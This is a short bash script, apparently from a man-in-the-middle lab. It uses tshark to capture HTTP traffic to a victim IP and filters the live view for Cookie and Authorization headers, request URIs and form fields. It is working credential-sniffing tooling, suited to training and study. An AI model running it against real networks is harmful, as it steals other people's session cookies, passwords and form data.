#!/usr/bin/env bash
# Capture HTTP requests/responses passing through the attacker.
set -euo pipefail
source "$(dirname "$0")/lab.env"
mkdir -p "$CAPTURE_DIR"
OUT="$CAPTURE_DIR/http-$(date +%Y%m%d-%H%M%S).pcap"

echo "[*] Writing pcap: $OUT"
echo "[*] Filter: tcp port 80 and host $VICTIM_IP"
echo "[*] Live view: HTTP request lines + form bodies."
echo

# -Y: display filter (post-capture) so we still write everything in the BPF to disk
exec tshark -i "$IFACE" \
  -f "tcp port 80 and host $VICTIM_IP" \
  -w "$OUT" \
  -P -V -Y "http.request or http.response" \
  2>/dev/null | grep -E "^(POST|GET|Host:|Cookie:|Authorization:|.*&.*=.*|.*Full request URI.*|.*Form item.*)" --line-buffered
